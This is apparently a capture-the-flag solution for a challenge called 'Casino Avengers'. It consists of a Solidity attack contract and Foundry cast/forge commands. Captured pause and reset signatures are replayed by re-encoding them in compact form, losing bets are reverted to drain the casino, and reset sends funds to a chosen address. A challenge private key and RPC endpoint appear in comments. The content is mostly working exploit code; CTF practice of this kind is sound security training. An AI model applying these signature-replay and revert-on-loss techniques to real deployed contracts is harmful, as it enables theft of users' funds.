# Casino Avengers

```solidity
interface ICasino {
    function balances(address) external returns (uint256);

    function availablePool() external view returns (uint256);
    function deposit(address receiver) external payable;
    function withdraw(address receiver, uint256 amount) external;
    function bet(uint256 amount) external returns (bool);

    function pause(bytes memory signature, bytes32 salt) external;
    function reset(
        bytes memory signature,
        address payable receiver,
        uint256 amount,
        bytes32 salt
    ) external;
}

/*
export PK=0xd35107733de91169ef08a64e675e4602287d6c6fb51c64f98c36e9e044c05d57

export ETH_RPC_URL=http://139.59.151.247:8545/QtDURdYKPdmFZMDpHSCtoabg/main
export CHAL=0x5ab8ffCDb5178FCb19BAE5A888350eA7A31286A2
export PLAYER=`cast call $CHAL "PLAYER()(address)"`
export CASINO=`cast call $CHAL "CASINO()(address)"`

cast call $CASINO "paused()(bool)"
cast balance $PLAYER
echo $CASINO
*/

/*
// by imssm99
cast block 2
cast tx 0xd79b6a67bd1dd1348b702418cda15bfc89c5e628cc4791a4b480a68379ec6ac3
cast decode-calldata "pause(bytes,bytes32)" 0xfab0039700000000000000000000000000000000000000000000000000000000000000405365718353c0589dc12370fcad71d2e7eb4dcb557cfbea5abb41fb9d4a9ffd3a00000000000000000000000000000000000000000000000000000000000000410de83bcb39df1075d76227634ff1d169db06051612a7bcdca81e7217882cd72412d43d853faf417f7d547817cfbfc5bbd794e8de6f9e3a7bd0c905fc015f9ced1b00000000000000000000000000000000000000000000000000000000000000

cast block 3
cast tx 0x8890d675419f9dabba30bc7c94d54058f2a0754bcbe893038e2a3df0706e2c3d
cast decode-calldata "reset(bytes,address,uint256,bytes32)" 0x7e75df8b000000000000000000000000000000000000000000000000000000000000008000000000000000000000000067b392743a10c4b5c07db61966f34049041a732b0000000000000000000000000000000000000000000000000de0b6b3a76400007867dc2b606f63c4ad88af7e48c7b934255163b45fb275880b4b451fa5d25e1b0000000000000000000000000000000000000000000000000000000000000041c8f174f593dc082ef7ee2c6b35fd383e0041dbdb59be8f5f0e8492de9fdd41d22374de6e686f25e12d9ffcfb5fe7d3d53e23561fd6b5f9ea4c9be2438e7720701c00000000000000000000000000000000000000000000000000000000000000

-> Update signatures below
*/

/*
forge create solve.sol:Attack --broadcast --evm-version shanghai --private-key $PK

export ATTACK=0x68b1e86d8E86859c0e262ad0C7Fc75a38e804Fcb

cast send $ATTACK "unpause()" --private-key $PK
cast call $CASINO "paused()(bool)"

cast send $ATTACK "deposit()" --value 0.2ether --private-key $PK
cast send $ATTACK "earnMoney()" --private-key $PK
cast call $CASINO "balances(address)(uint256)" $ATTACK

cast call $ATTACK "reset(address)" 0x67b392743a10c4B5c07DB61966f34049041A732b --private-key $PK --trace
cast send $ATTACK "reset(address)" 0x67b392743a10c4B5c07DB61966f34049041A732b --private-key $PK

cast balance $CASINO
*/

contract Attack {
    ICasino casino = ICasino(0x9F1A0Ff100F1F3aD516D5440afC118f137F25579);

    receive() external payable {}

    function deposit() public payable {
        casino.deposit{value: msg.value}(address(this));
    }

    function splitSignature(
        bytes memory signature
    ) public pure returns (uint256 r, uint256 s, uint8 v) {
        require(signature.length == 65, "Invalid signature length");

        assembly {
            // First 32 bytes stores the length of the signature
            // add(sig, 32) = pointer of sig + 32
            // effectively, skips first 32 bytes of signature
            r := mload(add(signature, 32))
            // Second 32 bytes
            s := mload(add(signature, 64))
            // Final byte (first byte of the next 32 bytes)
            v := byte(0, mload(add(signature, 96)))
        }

        // Version of signature should be 27 or 28
        require(v == 27 || v == 28, "Invalid signature v value");

        return (r, s, v);
    }

    function unpause() public {
        bytes32 salt = 0x5365718353c0589dc12370fcad71d2e7eb4dcb557cfbea5abb41fb9d4a9ffd3a;
        bytes
            memory originalSignature = hex"0de83bcb39df1075d76227634ff1d169db06051612a7bcdca81e7217882cd72412d43d853faf417f7d547817cfbfc5bbd794e8de6f9e3a7bd0c905fc015f9ced1b";

        (uint256 r, uint256 s, uint8 v) = splitSignature(originalSignature);
        uint256 vs = s | (uint256(v - 27) << 255);

        bytes memory signature = abi.encodePacked(r, vs);
        casino.pause(signature, salt);
    }

    function reset(address payable system) public {
        bytes32 salt = 0x7867dc2b606f63c4ad88af7e48c7b934255163b45fb275880b4b451fa5d25e1b;
        bytes
            memory originalSignature = hex"c8f174f593dc082ef7ee2c6b35fd383e0041dbdb59be8f5f0e8492de9fdd41d22374de6e686f25e12d9ffcfb5fe7d3d53e23561fd6b5f9ea4c9be2438e7720701c";

        (uint256 r, uint256 s, uint8 v) = splitSignature(originalSignature);
        uint256 vs = s | (uint256(v - 27) << 255);

        bytes memory signature = abi.encodePacked(r, vs);
        casino.reset(signature, system, 1 ether, salt);
    }

    uint256 private myBalance;

    function tryBet(uint256 amount) external {
        bool win = casino.bet(amount);
        if (!win) {
            revert("Lost bet");
        }
        myBalance += amount;
    }

    function earnMoney() public {
        uint256 TARGET_BALANCE = uint256(~~~address(casino).balance);
        myBalance = casino.balances(address(this));

        while (myBalance < TARGET_BALANCE) {
            uint256 amount = TARGET_BALANCE - myBalance <= myBalance
                ? TARGET_BALANCE - myBalance
                : myBalance;
            address(this).call(abi.encodeCall(this.tryBet, (amount)));
        }
    }

    function refund() public {
        address(msg.sender).call{value: address(this).balance}("");
    }
}
```
